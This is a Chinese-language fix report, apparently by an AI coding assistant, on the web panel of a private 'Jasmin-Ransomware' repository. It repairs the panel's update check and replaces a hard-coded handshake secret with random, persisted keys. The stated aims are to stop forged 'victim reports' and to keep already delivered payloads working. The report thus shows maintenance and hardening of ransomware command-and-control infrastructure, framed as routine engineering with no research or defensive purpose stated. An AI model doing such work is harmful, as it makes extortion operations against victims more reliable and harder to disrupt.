## 一、D1 —— `update.php` 不加载 `.env`，导致私有仓库更新检查失效

### 现象

`GET /update.php?check=1` 在已配置 `GIT_TOKEN` 的情况下仍返回：

```json
{"ok":true,"update":false,"current":"3.0.0","msg":"无法连接更新服务器"}
```

### 根因

`.env` 的解析函数 `loadEnv()` 原先**只定义在 `database/db_conection.php` 内部**。
遍历所有入口的 `require` 关系后确认：

```
handshake.php       -> database/db_conection.php          ✅ 能读 .env
install.php         -> database/db_conection.php          ✅
setup.php           -> database/db_conection.php          ✅
change_password.php -> database/db_conection.php          ✅
checklogin.php      -> database/db_conection.php          ✅
dashboard.php       -> database/db_conection.php          ✅
update.php          -> includes/{auth,platform,csrf}.php  ❌ 无一处加载 .env
```

`update.php` 本身依赖 `GIT_TOKEN`（私有仓库必需）：

```php
define('GIT_TOKEN', trim(getenv('GIT_TOKEN') ?: ($_ENV['GIT_TOKEN'] ?? '')));
```

环境变量未设、`$_ENV` 未填充 → `GIT_TOKEN` 恒为 `''` → `Authorization` 头不带凭据 →
访问私有仓库 `raw.githubusercontent.com` 返回 404 → 前端显示"无法连接更新服务器"。

**注意**：这**只影响私有仓库**。若仓库是公开的，无 token 也能拉取，问题不会显现 ——
这正是它长期未被发现的原因。

### 佐证（真实请求）

```bash
$ curl -s -o /dev/null -w "%{http_code}" \
    https://raw.githubusercontent.com/2016xyz/Jasmin-Ransomware-Private/master/VERSION
404                       # 无 token：私有仓库拒绝
$ curl -s -H "Authorization: token ghp_***" \
    https://raw.githubusercontent.com/2016xyz/Jasmin-Ransomware-Private/master/VERSION
3.0.0                     # 带 token：正常
```

网络与更新源本身均正常（`api.github.com` 200），问题纯在 `GIT_TOKEN` 未注入。

### 修复

1. **新增 `Web Panel/includes/env.php`** —— 把 `.env` 解析抽为统一入口：

```php
function env_path(): string { return __DIR__ . '/../.env'; }

function loadEnv(string $path = ''): void {
    $path = ($path !== '') ? $path : env_path();
    if (!is_file($path)) return;
    foreach (file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        $line = trim($line);
        if ($line === '' || $line[0] === '#' || strpos($line, '=') === false) continue;
        [$k, $v] = explode('=', $line, 2);
        $k = trim($k);
        if ($k === '') continue;
        $_ENV[$k] = trim($v);          // 只写 $_ENV，不 putenv（避免 mod_php 跨请求泄漏）
    }
}

function env_get(string $key, string $default = ''): string { /* $_ENV > getenv > 默认 */ }

loadEnv();                              // 引入即生效
```

2. **`update.php`** 增加 `require_once __DIR__ . '/includes/env.php';`，并把
   `GIT_TOKEN` 改为 `define('GIT_TOKEN', env_get('GIT_TOKEN'));`

3. **`database/db_conection.php`** 删除自己的 `loadEnv()` 定义，改为 `require` 统一入口；
   同时**移除凭据的弱默认值**（原为 `$_ENV['DB_USER'] ?? 'jasminadmin'` 等）：
   未显式配置即报错，不再静默回落到默认账号。

### 修复验证（同一实例，前后对照）

| 状态 | `GET /update.php?check=1` 返回 |
|---|---|
| 修复前 | `{"ok":true,"update":false,"current":"3.0.0","msg":"无法连接更新服务器"}` |
| **修复后** | `{"ok":true,"update":false,"current":"3.0.0","latest":"3.0.0","latest_commit":"abc805b","date":"2026-10-05T11:42:29Z","message":"release: v3.0.0\n\n版本号 2.9.10 -> 3.0.0（主版本发布）…"}` |

已能取回远端真实 commit 信息与提交说明，更新检查链路完全打通。

## 二、D2 —— 握手密钥硬编码 `jasmin@123` 遍布全栈

### 完整清单（修复前，共 15 处）

| `Web Panel Python/templates/install.html:66` | `value="jasmin@123"` | 🟠 |
| `Web Panel Python/templates/dashboard.html:67` | `value="jasmin@123"` | 🟠 |

### 为什么危险（关键点）

`handshake.php` 的**保护逻辑本身是对的**：

```php
$secret = $_ENV['HANDSHAKE_SECRET'] ?? '';
if ($secret === '') { http_response_code(503); echo 'Handshake secret not configured.'; exit; }
if (!hash_equals($secret, post_str('handshake'))) { http_response_code(403); ... }
```

但 `docker/entrypoint-php.sh` 会**主动把 `jasmin@123` 写进 `.env`**，使 `$secret` 非空 ——
"未配置则拒绝"的分支永远走不到，**保护被完全绕过**。于是任何按默认 `docker compose up`
部署的实例，都能被任何人用源码里公开的 `jasmin@123` 伪造受害者上报、污染取证数据。

同时，Python 端 `app.py:157` 做的是同义之事：config.json 与进程环境变量都缺失时直接回落到
`jasmin@123`，连"拒绝服务"的台阶都没有。

### 修复

**统一原则：任何地方都不再回落到公开默认值；未配置 → 生成随机值（可持久化）或失败闭合。**

#### 1. `docker/entrypoint-php.sh`（生成随机 + 持久化到共享卷）

```bash
SECRET_FILE=/var/www/html/payloads/.handshake_secret
if [ -f "$SECRET_FILE" ] && [ -s "$SECRET_FILE" ]; then
  _PERSISTED_SECRET=$(cat "$SECRET_FILE")
fi
if [ -z "${HANDSHAKE_SECRET:-}" ]; then
  if [ -n "${_PERSISTED_SECRET:-}" ]; then
    HANDSHAKE_SECRET="$_PERSISTED_SECRET"          # 重启沿用，不破坏已投递载荷
  else
    HANDSHAKE_SECRET=$(head -c 32 /dev/urandom | od -An -tx1 | tr -d ' \n')
    printf '%s' "$HANDSHAKE_SECRET" > "$SECRET_FILE"
    chmod 0640 "$SECRET_FILE"; chown www-data:www-data "$SECRET_FILE"
    echo "[entrypoint] !! HANDSHAKE_SECRET 未设置 —— 已生成随机密钥并持久化"
  fi
fi
export HANDSHAKE_SECRET
...
HANDSHAKE_SECRET=${HANDSHAKE_SECRET}      # .env 写入实际值，不再有 :-jasmin@123
```

`payloads/` 是共享卷且对 `.` 开头文件有 `.htaccess` deny + `router.php` 拦截，密钥不外泄；
PHP 与 Python 两个容器读写**同一份**，多副本一致。

#### 2. `docker/entrypoint-python.sh`

同样的解析逻辑（路径 `/app/payloads/.handshake_secret`），
并把 `os.environ.get('HANDSHAKE_SECRET', 'jasmin@123')` 改为 `os.environ.get('HANDSHAKE_SECRET', '')`。

#### 3. compose 编排（4 个文件、7 处）

`${HANDSHAKE_SECRET:-jasmin@123}` → `${HANDSHAKE_SECRET:-}`（交由 entrypoint 生成并持久化）

#### 4. `Web Panel Python/app.py`

```python
# 新增：加载 .env（修复前 Python 面板完全不读 .env）
def _load_dotenv(path=None): ...        # 真实环境变量优先，不被 .env 覆盖
_load_dotenv()

# 运行时：去掉硬编码兜底
app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret') or os.environ.get('HANDSHAKE_SECRET') or ''

# 安装向导：留空则生成随机密钥，而非回落到公开默认值
secret = (request.form.get('secret') or '').strip() or secrets.token_urlsafe(24)
```

#### 5. `Web Panel/generate.php` / `install.php`

```php
// generate.php：无默认值，空值被后续白名单正则 {1,64} 拒绝并提示
$secret = trim((string)($_POST['secret'] ?? ''));

// install.php：留空 → 生成随机密钥（而非公开默认值）
$secret = trim(post_str('secret'));
if ($secret === '') { $secret = bin2hex(random_bytes(16)); }
```

#### 6. 表单预填改为"读取当前配置"

```php
// dashboard.php：预填服务器实际配置的密钥（登录后可见，比写死默认值更有用）
value="<?=h(env_get('HANDSHAKE_SECRET'))?>"
```
```html
<!-- install.html：留空并给出提示 -->
<input name="secret" placeholder="留空将自动生成随机密钥" required>
```

1. **版本号未变**：本次缺陷修复并入已发布的 **3.0.0**，未单独升版。
   如需独立版本号（如 `3.0.1`）以标记这两个缺陷，说一声即可。
